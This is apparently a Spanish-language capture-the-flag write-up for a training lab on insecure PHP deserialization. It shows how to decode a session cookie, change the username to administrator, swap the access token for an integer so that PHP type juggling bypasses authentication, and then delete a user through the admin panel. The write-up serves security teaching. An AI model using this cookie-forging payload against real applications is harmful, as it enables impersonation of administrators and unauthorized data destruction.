# 🧬 Modificación de tipos de datos serializados

## 📄 Descripción del laboratorio

Este laboratorio utiliza **serialización de objetos PHP para gestionar la sesión del usuario**.\
La cookie de sesión contiene un objeto serializado que el backend deserializa directamente para reconstruir el estado del usuario.

Debido a una validación incorrecta de tipos tras la deserialización, es posible modificar manualmente el objeto y **bypassear el sistema de autenticación**.

🎯 **Objetivo del laboratorio:**

* Obtener acceso como `administrator`
* Acceder al panel administrativo
* Eliminar al usuario `carlos`

Credenciales iniciales:

```
wiener : peter
```



## 📚 Teoría

El backend crea un objeto `User` al iniciar sesión.

Este objeto contiene dos propiedades relevantes:

```
username
access_token
```

El flujo de sesión funciona así:

```
1. El backend crea el objeto User
2. El objeto se serializa con serialize()
3. El resultado se codifica (Base64)
4. El valor se almacena en una cookie
```

En cada petición el servidor:

```
lee la cookie
la decodifica
ejecuta unserialize()
confía en los valores del objeto
```

Un ejemplo del objeto serializado sería:

```
O:4:"User":2:{
  s:8:"username";s:6:"wiener";
  s:12:"access_token";s:32:"keknmi4m80zclyhskoyxse0yl9k7sfap";
}
```

### 📌 Validación débil del token

El backend utiliza el valor de `access_token` para decidir si el usuario está autenticado.

El problema es que **no se valida estrictamente el tipo de dato**.

En PHP, debido al **type juggling**, un valor como:

```
i:0
b:1
```

puede pasar comprobaciones débiles como:

```
if ($user->access_token)
if ($user->access_token != null)
```

Esto permite reemplazar el token real por un valor de tipo distinto y conseguir que la validación pase.



## 📝 Práctica

### 1️⃣ Iniciar sesión y capturar la cookie

Iniciamos sesión con:

```
wiener : peter
```

Accedemos a `/my-account` y observamos la cookie de sesión en Burp.

Ejemplo:

```
session=eyJ...
```



### 2️⃣ Decodificar el objeto serializado

Enviamos el valor de la cookie a **Burp Decoder**.

Proceso habitual:

```
URL decode
Base64 decode
```

El resultado es el objeto PHP serializado:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"keknmi4m80zclyhskoyxse0yl9k7sfap";}
```

<img width="1020" height="203" alt="image" src="https://github.com/user-attachments/assets/f12b6ad0-621c-41b8-9791-56992e2ab650" />



### 3️⃣ Modificar el nombre de usuario

Queremos suplantar al administrador.

Cambiamos:

```
s:6:"wiener"
```

por:

```
s:13:"administrator"
```

Es imprescindible ajustar la longitud del string.

<img width="268" height="164" alt="image" src="https://github.com/user-attachments/assets/9624ed4e-fbb9-4257-9ddc-c6da49a46323" />



### 4️⃣ Modificar el tipo de access\_token

El campo original es un string:

```
s:12:"access_token";s:32:"keknmi4m80zclyhskoyxse0yl9k7sfap";
```

Lo reemplazamos por un entero:

```
s:12:"access_token";i:0;
```

<img width="270" height="155" alt="image" src="https://github.com/user-attachments/assets/11f89e66-92eb-4c61-aee0-aacd0c55086b" />
<br>

El objeto final queda así:

```
O:4:"User":2:{
  s:8:"username";s:13:"administrator";
  s:12:"access_token";i:0;
}
```

No se modifican otros campos ni la estructura del objeto.



### 5️⃣ Recodificar la cookie

Codificamos nuevamente el objeto modificado:

```
Base64 encode
URL encode (si aplica)
```

En Burp esto puede hacerse desde el **Inspector**, aplicando los cambios automáticamente.



### 6️⃣ Acceder como administrador

Enviamos la petición con la cookie modificada.

La aplicación ahora muestra funcionalidades administrativas.

Accedemos a:

```
/admin
```

El acceso se concede correctamente.

<img width="889" height="713" alt="image" src="https://github.com/user-attachments/assets/d36a472d-904e-4b4d-ae97-91a9f808d7f7" />



### 7️⃣ Eliminar al usuario carlos

Desde el panel administrativo localizamos al usuario `carlos`.

La acción ejecuta una petición similar a:

```
/admin/delete?username=carlos
```

El servidor procesa la solicitud y elimina la cuenta.

<img width="723" height="301" alt="image" src="https://github.com/user-attachments/assets/78afeae1-94bf-4a70-8504-013a26c14e61" />



### 8️⃣ Resultado

Se consigue:

* Suplantar al usuario `administrator`
* Bypassear la validación del token mediante **type juggling**
* Acceder al panel administrativo
* Eliminar al usuario `carlos`

✅ **Laboratorio resuelto.**
